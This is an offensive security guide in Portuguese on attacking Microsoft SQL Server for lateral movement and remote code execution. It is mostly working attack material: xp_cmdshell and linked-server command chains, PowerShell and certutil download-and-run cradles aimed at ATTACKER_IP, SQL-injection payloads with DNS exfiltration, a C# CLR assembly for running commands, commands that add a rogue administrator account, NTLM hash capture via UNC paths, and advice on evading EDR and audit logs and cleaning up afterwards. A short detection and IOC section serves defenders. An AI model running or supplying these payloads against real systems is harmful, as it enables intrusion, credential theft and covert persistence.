---
title: "MSSQL Lateral Movement & RCE"
---

# MSSQL: Movimento Lateral e Execução Remota de Código

## xp_cmdshell, Linked Servers e o Caminho Para SYSTEM

SQL Server é uma das plataformas de banco de dados mais prevalentes em ambientes corporativos Windows/Active Directory. Administradores frequentemente configuram Linked Servers para facilitar consultas entre instâncias — e essa funcionalidade, quando combinada com permissões excessivas, cria um caminho direto de movimento lateral e escalada de privilégios sem necessidade de explorar vulnerabilidades de dia-zero.

Encontrar uma instância SQL Server com `xp_cmdshell` habilitado ou com permissão para habilitá-lo é equivalente a ter uma shell direta no host. Mesmo quando `xp_cmdshell` está desabilitado e monitorado, alternativas como CLR Assemblies, UNC paths para captura de hash NTLM e cadeias de Linked Servers oferecem múltiplos vetores de ataque. O MSSQL é frequentemente executado com contas de serviço altamente privilegiadas — muitas vezes `NT AUTHORITY\SYSTEM` ou contas de domínio com permissões amplas — tornando o comprometimento de uma instância SQL potencialmente catastrófico para toda a organização. Casos de uso em engajamentos reais incluem pivot de rede via SQL Server para segmentos inacessíveis, captura de hashes NetNTLM via UNC path, execução de código em servidores remotos através de cadeias de Linked Servers, escalada de MSSQL User para SYSTEM no host e dump de credenciais armazenadas no SQL Server.

---

## Linked Server Chains: Do Login Público ao sysadmin Remoto

### Arquitetura de Linked Servers

Linked Servers são configurações que permitem que uma instância SQL Server execute consultas em outra instância (local ou remota). A autenticação entre servidores pode ocorrer de três formas:

1. **Self-mapping**: o login atual é mapeado para o mesmo login no servidor remoto
2. **Fixed mapping**: um login específico é sempre usado para a conexão (credenciais armazenadas no SQL Server)
3. **Pass-through**: a conexão usa as credenciais do contexto de execução atual

**Por que isso importa para o atacante:** Se o Linked Server está configurado com um login que tem privilégios `sysadmin` no servidor remoto, qualquer usuário que possa executar queries no servidor local pode, potencialmente, executar como sysadmin no servidor remoto.

### Fluxo de xp_cmdshell

`xp_cmdshell` é um stored procedure estendido que permite execução de comandos do sistema operacional como o processo do SQL Server (que frequentemente roda como SYSTEM ou como conta de domínio privilegiada). O fluxo de habilitação é:

```
sp_configure 'show advanced options', 1 → RECONFIGURE
sp_configure 'xp_cmdshell', 1 → RECONFIGURE
EXEC xp_cmdshell 'comando'
```

Requer privilégio `sysadmin` ou `CONTROL SERVER`.

### CLR Assembly como Alternativa

Quando `xp_cmdshell` está bloqueado por políticas ou monitorado ativamente, CLR (Common Language Runtime) Assemblies permitem executar código .NET diretamente dentro do SQL Server. Requer:
- CLR habilitado: `sp_configure 'clr enabled', 1`
- Permissão `sysadmin` ou `ALTER ASSEMBLY` + `UNSAFE ASSEMBLY`
- Banco de dados configurado como `TRUSTWORTHY` ou assembly com certificado válido

### Captura de Hash via UNC Path

SQL Server tenta autenticar em compartilhamentos de rede usando as credenciais da conta de serviço. Ao forçar uma conexão UNC para um servidor controlado pelo atacante, captura-se o hash NetNTLM da conta de serviço — que pode ser usado em ataques de relay ou crackeado offline.

### Impersonation e Escalada de Privilégio

SQL Server permite que usuários com permissão `IMPERSONATE` assumam o contexto de outro login. Isso é frequentemente usado para escalada: um usuário com poucos privilégios pode se tornar `sa` ou outro login sysadmin se tiver permissão de impersonation explícita.

---

## Na Prática

### Fase 1: Enumeração Inicial

Antes de tentar qualquer exploração, enumere o ambiente para entender o que está disponível.

**Via PowerUpSQL (PowerShell):**
```powershell
# Importar o módulo
Import-Module PowerUpSQL.ps1

# Descobrir instâncias SQL na rede
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDP -ComputerName "192.168.1.0/24"

# Testar conectividade e autenticação
Get-SQLConnectionTestThreaded -Instances "SERVER\INSTANCE" -Username "domain\user" -Password "pass"

# Auditoria de permissões do usuário atual
Invoke-SQLAudit -Instance "SERVER\INSTANCE" -Verbose

# Verificar se o usuário atual é sysadmin
Get-SQLQuery -Instance "SERVER\INSTANCE" -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"
```

**Via queries SQL diretas:**
```sql
-- Identificar servidor e versão
SELECT @@SERVERNAME, @@VERSION;

-- Verificar role do usuário atual
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');

-- Listar todos os logins e suas roles
SELECT sp.name, sp.type_desc, spr.name as role_name
FROM sys.server_principals sp
LEFT JOIN sys.server_role_members srm ON sp.principal_id = srm.member_principal_id
LEFT JOIN sys.server_principals spr ON srm.role_principal_id = spr.principal_id
WHERE sp.type NOT IN ('R', 'G')
ORDER BY sp.name;

-- Verificar configurações avançadas
EXEC sp_configure;

-- Verificar se xp_cmdshell está habilitado
SELECT name, value, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Listar bancos de dados
SELECT name, is_trustworthy_on FROM sys.databases;

-- Verificar quem pode ser impersonado
SELECT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

### Fase 2: Linked Servers

**Enumeração de Linked Servers:**
```sql
-- Listar todos os servidores linkados
SELECT * FROM sys.servers;

-- Informações detalhadas sobre linked servers
SELECT name, product, provider, data_source, is_linked, 
       is_remote_login_enabled, is_rpc_out_enabled
FROM sys.servers
WHERE is_linked = 1;

-- Listar mapeamentos de login dos linked servers
SELECT ls.name as linked_server, ll.remote_name, ll.uses_self_credential
FROM sys.linked_logins ll
JOIN sys.servers ls ON ll.server_id = ls.server_id;
```

**Execução de queries em Linked Servers:**
```sql
-- Executar query simples no servidor linkado
EXECUTE('SELECT @@servername, @@version') AT [LINKED_SERVER_NAME];

-- Alternativa com OPENQUERY (retorna resultado como tabela)
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@servername, SYSTEM_USER');

-- Verificar se é sysadmin no servidor remoto
EXECUTE('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER_NAME];
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

**Duplo salto (chaining) — traversal de múltiplos links:**
```sql
-- Executar em LINKED2 via LINKED1 (double hop)
EXECUTE('EXECUTE(''SELECT @@servername, SYSTEM_USER'') AT [LINKED2]') AT [LINKED1];

-- Triple hop
EXECUTE('EXECUTE(''EXECUTE(''''SELECT @@servername'''') AT [LINKED3]'') AT [LINKED2]') AT [LINKED1];

-- Via PowerUpSQL — mapear recursivamente todos os linked servers
Get-SQLServerLinkCrawl -Instance "SERVER\INSTANCE" -Verbose

# Output mostrará árvore de links:
# Root  -> SERVIDOR1 (sysadmin: 0)
#   -> SERVIDOR2 (sysadmin: 1)  <- ponto de interesse!
```

### Fase 3: xp_cmdshell via Linked Server

```sql
-- Habilitar xp_cmdshell no servidor remoto (requer sysadmin no remoto)
EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SERVER];
EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SERVER];

-- Executar comando OS no servidor remoto
EXECUTE('EXECUTE xp_cmdshell ''whoami''') AT [LINKED_SERVER];
EXECUTE('EXECUTE xp_cmdshell ''hostname''') AT [LINKED_SERVER];
EXECUTE('EXECUTE xp_cmdshell ''ipconfig /all''') AT [LINKED_SERVER];

-- Verificar usuário do serviço SQL no servidor remoto
EXECUTE('EXECUTE xp_cmdshell ''whoami /priv''') AT [LINKED_SERVER];

-- Duplo hop com xp_cmdshell
EXECUTE('EXECUTE(''EXECUTE xp_cmdshell ''''whoami'''''' ) AT [LINKED2]') AT [LINKED1];
```

**Via PowerUpSQL — execução automatizada:**
```powershell
# Executar OS command via cadeia de linked servers
Invoke-SQLOSCmd -Instance "SERVIDOR1\INSTANCE" -Command "whoami" -Verbose

# Com credenciais explícitas
Invoke-SQLOSCmd -Instance "SERVIDOR1\INSTANCE" -Command "whoami" -Username "domain\user" -Password "pass" -Verbose

# Listar e executar via link
Get-SQLServerLinkCrawl -Instance "SERVER\INSTANCE" | 
    Where-Object {$_.Sysadmin -eq 1} | 
    ForEach-Object { Invoke-SQLOSCmd -Instance $_.Instance -Command "whoami" }
```

### Fase 4: Download e Execução de Payload via xp_cmdshell

```sql
-- PowerShell download cradle via xp_cmdshell
EXECUTE xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')"';

-- Download e execução de arquivo
EXECUTE xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/beacon.exe -OutFile C:\Windows\Temp\svc.exe; Start-Process C:\Windows\Temp\svc.exe"';

-- Payload em base64 (para evitar aspas problemáticas)
-- 1. Primeiro, gere o payload no Kali:
-- $cmd = "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
-- $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-- $encoded = [Convert]::ToBase64String($bytes)
-- echo $encoded

-- 2. Execute no MSSQL:
EXECUTE xp_cmdshell 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAEEAVABUAEEAQwBLAEUAUgBfAEkAUAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=';

-- certutil como alternativa para download
EXECUTE xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER_IP/beacon.exe C:\Windows\Temp\svc.exe';
EXECUTE xp_cmdshell 'C:\Windows\Temp\svc.exe';

-- Via Linked Server com payload
EXECUTE('EXECUTE xp_cmdshell ''powershell -enc BASE64ENCODED''') AT [LINKED_SERVER];
```

### Fase 5: UNC Path para Captura de Hash NTLM

Esta técnica não requer sysadmin e funciona com permissões mínimas. Força o SQL Server a autenticar em um servidor SMB controlado pelo atacante, capturando o hash NetNTLM da conta de serviço.

**Setup no Kali Linux:**
```bash
# Iniciar Responder para capturar hashes
sudo responder -I eth0 -wrf

# Ou usar impacket ntlmrelayx para relay direto
sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support
```

**Execução no SQL Server (qualquer usuário com permissão de query):**
```sql
-- Método 1: xp_dirtree (não requer sysadmin em versões antigas)
EXECUTE xp_dirtree '\\ATTACKER_IP\share';

-- Método 2: xp_fileexist
EXECUTE xp_fileexist '\\ATTACKER_IP\share\file.txt';

-- Método 3: BACKUP LOG (requer permissão de backup)
BACKUP LOG [master] TO DISK = '\\ATTACKER_IP\share\backup.bak';

-- Método 4: RESTORE FILELISTONLY
RESTORE FILELISTONLY FROM DISK = '\\ATTACKER_IP\share\file.bak';

-- Via Linked Server (para capturar hash da conta de serviço do servidor remoto)
EXECUTE('EXECUTE xp_dirtree ''\\ATTACKER_IP\share''') AT [LINKED_SERVER];
```

**Resultado esperado no Responder:**
```
[SMB] NTLMv2-SSP Client   : 192.168.1.50
[SMB] NTLMv2-SSP Username : DOMAIN\mssql_svc
[SMB] NTLMv2-SSP Hash     : mssql_svc::DOMAIN:abc123...:def456...:0101000...

# Crackear com hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Fase 6: Impersonation para Escalada de Privilégio

```sql
-- Verificar quem pode ser impersonado pelo usuário atual
SELECT b.name as who_can_be_impersonated
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
AND a.grantee_principal_id = USER_ID();

-- Alternativamente, listar todas as permissões de impersonate
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonar o login 'sa'
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- Deve retornar 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Deve retornar 1

-- Agora pode habilitar xp_cmdshell
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

-- Voltar ao contexto original
REVERT;
```

### Fase 7: CLR Assembly (Quando xp_cmdshell está bloqueado)

Esta técnica requer `sysadmin` e é mais discreta que `xp_cmdshell` pois os eventos de criação de processo são diferentes.

**Criar a DLL .NET (C#):**
```csharp
// StoredProcedures.cs
using System;
using System.Data.SqlTypes;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

public class StoredProcedures {
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void ExecCommand(SqlString command) {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + command.Value;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        
        string output = proc.StandardOutput.ReadToEnd();
        proc.WaitForExit();
        
        SqlContext.Pipe.Send(output);
    }
}
```

**Compilar:**
```bash
# No Windows ou via cross-compile
csc /target:library /out:StoredProcedures.dll StoredProcedures.cs

# Converter para hex para insert no SQL
$bytes = [IO.File]::ReadAllBytes('StoredProcedures.dll')
$hex = '0x' + ($bytes | ForEach-Object { $_.ToString('X2') }) -join ''
```

**Instalar no SQL Server:**
```sql
-- 1. Habilitar CLR
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'clr enabled', 1;
RECONFIGURE;

-- 2. Marcar banco como TRUSTWORTHY (ou usar certificado)
ALTER DATABASE master SET TRUSTWORTHY ON;

-- 3. Criar assembly a partir do DLL (hex)
CREATE ASSEMBLY [StoredProcedures]
FROM 0x4D5A90000300000004000000FFFF0000B800000000000000... -- hex do DLL
WITH PERMISSION_SET = UNSAFE;

-- 4. Criar stored procedure que chama o método .NET
CREATE PROCEDURE [dbo].[ExecCommand] @command NVARCHAR(MAX)
AS EXTERNAL NAME [StoredProcedures].[StoredProcedures].[ExecCommand];

-- 5. Executar
EXEC dbo.ExecCommand 'whoami';
EXEC dbo.ExecCommand 'net user hacker P@ssw0rd /add';
EXEC dbo.ExecCommand 'net localgroup administrators hacker /add';

-- Limpeza após uso
DROP PROCEDURE ExecCommand;
DROP ASSEMBLY StoredProcedures;
sp_configure 'clr enabled', 0;
RECONFIGURE;
```

### Fase 8: Impacket mssqlclient.py

```bash
# Conectar com autenticação Windows (Kerberos/NTLM)
mssqlclient.py DOMAIN/user:password@TARGET_IP -windows-auth

# Conectar com autenticação SQL Server
mssqlclient.py sa:password@TARGET_IP

# Com porta customizada
mssqlclient.py DOMAIN/user:password@TARGET_IP:1433 -windows-auth

# Comandos disponíveis dentro do mssqlclient:
# Habilitar xp_cmdshell
SQL> enable_xp_cmdshell

# Executar comandos OS
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "net user"
SQL> xp_cmdshell "powershell -enc BASE64"

# Usar linked server
SQL> use_link LINKED_SERVER_NAME
SQL> xp_cmdshell whoami  # agora executa no linked server

# Desabilitar xp_cmdshell após uso
SQL> disable_xp_cmdshell

# Queries SQL normais
SQL> SELECT @@version
SQL> SELECT * FROM sys.servers
```

### Fase 9: SQL Injection → RCE (Stacked Queries)

Quando existe SQL Injection com suporte a stacked queries (comandos separados por `;`), é possível escalar para execução de código OS:

```sql
-- Payload de SQLi que habilita xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Payload de SQLi que executa comando
'; EXEC xp_cmdshell 'whoami';--

-- Exfiltrar output via DNS (out-of-band, sem precisar ver resultado direto)
'; DECLARE @o VARCHAR(8000); EXEC xp_cmdshell 'whoami', @o OUTPUT; EXEC xp_cmdshell 'nslookup ' + @o + '.ATTACKER_DOMAIN.com';--

-- Via blind SQLi com delay para confirmar execução
'; EXEC xp_cmdshell 'ping -n 5 ATTACKER_IP';--
-- (observar 5 pings chegando no tcpdump)
```

---

## Exemplos de Código / Comandos

### Cheatsheet de Comandos Rápidos

```sql
-- ENUMERAÇÃO BÁSICA
SELECT @@SERVERNAME, @@VERSION, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;
SELECT * FROM sys.servers WHERE is_linked = 1;
SELECT name FROM sys.server_principals WHERE type = 'S'; -- SQL logins
SELECT name FROM sys.server_principals WHERE type = 'U'; -- Windows logins

-- LINKED SERVERS
EXECUTE('SELECT @@servername') AT [LINKED_SRV];
SELECT * FROM OPENQUERY([LINKED_SRV], 'SELECT @@servername');
EXECUTE('EXECUTE(''SELECT @@servername'') AT [LINKED2]') AT [LINKED1];

-- HABILITAR E USAR xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';
EXEC xp_cmdshell 'ipconfig /all';

-- VIA LINKED SERVER
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT [LINKED_SRV];
EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED_SRV];
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [LINKED_SRV];

-- CAPTURA DE HASH
EXEC xp_dirtree '\\ATTACKER_IP\share';
EXEC xp_fileexist '\\ATTACKER_IP\share\file';

-- IMPERSONATION
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
REVERT;
```

### PowerUpSQL — Comandos Completos

```powershell
# Importar módulo
. .\PowerUpSQL.ps1
# ou
Import-Module PowerUpSQL

# Descoberta
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP -ComputerName @("10.10.10.1","10.10.10.2")

# Conexão e Info
Get-SQLConnectionTestThreaded -Instance "SRV\INST" -Verbose
Get-SQLServerInfo -Instance "SRV\INST"
Get-SQLDatabase -Instance "SRV\INST"

# Auditoria
Invoke-SQLAudit -Instance "SRV\INST" -Verbose
Get-SQLServerPasswordHash -Instance "SRV\INST"  # Dump hashes de login SQL

# Linked Servers
Get-SQLServerLink -Instance "SRV\INST"
Get-SQLServerLinkCrawl -Instance "SRV\INST" -Verbose
Get-SQLServerLinkCrawl -Instance "SRV\INST" | Format-Table

# Execução de comandos OS
Invoke-SQLOSCmd -Instance "SRV\INST" -Command "whoami" -Verbose
Invoke-SQLOSCmd -Instance "SRV\INST" -Command "powershell -enc BASE64" -Verbose

# Escalar via linked server
Invoke-SQLEscalatePriv -Instance "SRV\INST" -Verbose

# Dump de senhas de SQL logins
Get-SQLServerPasswordHash -Instance "SRV\INST"
# Crackear: hashcat -m 1731 hashes.txt wordlist.txt
```

### impacket-mssqlclient Workflow Completo

```bash
# 1. Conectar
mssqlclient.py 'CONTOSO/sqlsvc:Password123@10.10.10.50' -windows-auth

# 2. Verificar privilégios
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');

# 3. Habilitar xp_cmdshell
SQL> enable_xp_cmdshell

# 4. Enumerar
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "net localgroup administrators"
SQL> xp_cmdshell "ipconfig /all"

# 5. Payload de reverse shell (PowerShell)
SQL> xp_cmdshell "powershell -w hidden -enc SQBFAFgA..."

# 6. Usar linked server
SQL> SELECT * FROM sys.servers
SQL> use_link REMOTE_SQL_SERVER
SQL> xp_cmdshell whoami

# 7. Limpeza
SQL> disable_xp_cmdshell
SQL> exit
```

---

## Detecção e OPSEC

### O Que Gera Alertas

| Técnica | Eventos Windows | Nível de Risco |
|---------|----------------|----------------|
| xp_cmdshell habilitado | SQL Audit Event (90 - Configuration changes) | Alto |
| xp_cmdshell executado | Processo filho de sqlservr.exe (cmd.exe, powershell.exe) | Alto |
| CLR Assembly criado | SQL Audit (CREATE ASSEMBLY) | Médio |
| UNC path via xp_dirtree | Event 4624 (logon de rede) na máquina do atacante | Baixo |
| Impersonation | SQL Audit Event (EXECUTE AS LOGIN) | Médio |
| Linked Server query | SQL Audit (RPC calls) | Baixo |

### Geração de Processos Filhos

O maior sinal de xp_cmdshell é a criação de processos filhos do `sqlservr.exe`:
```
sqlservr.exe → cmd.exe → whoami.exe
sqlservr.exe → powershell.exe → ...
```

Soluções EDR modernas (CrowdStrike, SentinelOne, Defender ATP) têm regras específicas para essa árvore de processos. Para mitigar:

1. **Use CLR Assembly**: o código roda dentro do processo do SQL Server, sem criar processos filhos visíveis
2. **PowerShell -WindowStyle Hidden -NoProfile**: reduz artefatos, mas processo ainda aparece
3. **Evite cmd.exe**: use PowerShell diretamente

### OPSEC para UNC Path (Hash Capture)

Esta é a técnica mais discreta pois:
- Não cria processos filhos visíveis
- Não requer alteração de configuração do servidor
- Parece um acesso normal a compartilhamento de rede
- Não deixa rastros no SQL Server além de query normal

**Porém:** Gera evento 4624 (logon de rede) no host do atacante e no Domain Controller. Use um redirecionador/relay ao invés de captura direta.

### Linked Servers Cross-Domain / Cross-Forest

Linked server pode cruzar domínios e florestas se RPC Out estiver habilitado e credenciais configuradas — bypass de trust via camada de aplicação.

```sql
-- Verificar se RPC Out está habilitado em cada linked server
SELECT name, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1

-- Habilitar RPC Out (requer sysadmin)
EXEC sp_serveroption 'SQL02', 'rpc out', 'true'

-- Executar stored procedure diretamente (requer RPC Out = true)
EXEC SQL02.master.dbo.xp_cmdshell 'whoami'

-- Alternativa: AT syntax (funciona com ou sem RPC Out via OpenQuery)
EXECUTE('xp_cmdshell ''whoami''') AT SQL02
```

Diferença entre os métodos:
- `EXEC SQL02.db.schema.proc` → requer RPC Out habilitado
- `EXECUTE('...') AT SQL02` → usa distributed query, funciona com RPC Out ou sem ele
- `OPENQUERY(SQL02, '...')` → menos auditado que AT syntax

### OPSEC para Linked Servers

Consultas em Linked Servers são registradas no SQL Audit como RPC (Remote Procedure Calls). Para reduzir detecção:
- Limite o número de queries de enumeração
- Execute via OPENQUERY quando possível (menos campos auditados)
- Realize operações em horários de pico de negócio

### Configurações de Auditoria SQL que Detectam o Ataque

```sql
-- Verificar se SQL Audit está ativo
SELECT * FROM sys.server_audits;
SELECT * FROM sys.server_audit_specifications;
SELECT * FROM sys.server_audit_specification_details;

-- Eventos críticos para monitorar (SQL Server Audit Action Groups):
-- SUCCESSFUL_LOGIN_GROUP
-- FAILED_LOGIN_GROUP  
-- SERVER_PRINCIPAL_CHANGE_GROUP
-- SERVER_OBJECT_CHANGE_GROUP (cobre CREATE ASSEMBLY)
-- DATABASE_PRINCIPAL_CHANGE_GROUP
-- AUDIT_CHANGE_GROUP
```

### Limpeza Pós-Exploração

```sql
-- Desabilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;

-- Remover CLR Assembly se criado
DROP PROCEDURE ExecCommand;
DROP ASSEMBLY [StoredProcedures];
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;
ALTER DATABASE master SET TRUSTWORTHY OFF;

-- Verificar e limpar jobs criados (se usou SQL Agent)
SELECT job_id, name FROM msdb.dbo.sysjobs;
EXEC msdb.dbo.sp_delete_job @job_name = 'nome_do_job';
```

### Indicadores de Comprometimento (IOCs)

- Processo `sqlservr.exe` gerando filhos (`cmd.exe`, `powershell.exe`, `net.exe`)
- Query em `sys.servers` fora do horário normal ou por usuário não-DBA
- Alteração em `sp_configure` para `xp_cmdshell` ou `clr enabled`
- Criação de `ASSEMBLY` em banco de dados
- Tentativa de acesso a `\\EXTERNO\share` originada do processo SQL Server
- `EXECUTE AS LOGIN = 'sa'` por usuário não-sa
- Múltiplos `EXECUTE ... AT [LINKED_SERVER]` em sequência rápida

---

## Módulos Relacionados

`01_mssql_fundamentos_e_enumeracao.md` fornece a enumeração inicial — descoberta de instâncias, roles e linked servers — que alimenta as cadeias de ataque aqui descritas. `../09_active_directory/02_kerberoasting_e_asrep.md` cobre Kerberoasting de SPNs `MSSQLSvc/` para obter o ticket de serviço da conta MSSQL. `../04_evasao/03_amsi_bypass.md` é relevante para bypassar AMSI antes de executar payloads via `xp_cmdshell` ou CLR Assembly.

**Ferramentas referenciadas:**
- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL
- impacket mssqlclient: https://github.com/fortra/impacket
- Responder: https://github.com/lgandx/Responder
- LOLDrivers (para técnicas de kernel): https://www.loldrivers.io

**MITRE ATT&CK:**
- T1505.001 — SQL Stored Procedures
- T1078 — Valid Accounts (via MSSQL credentials)
- T1021.002 — Lateral Movement via SMB (após hash capture + relay)
- T1557.001 — LLMNR/NBT-NS Poisoning (via Responder + UNC path)
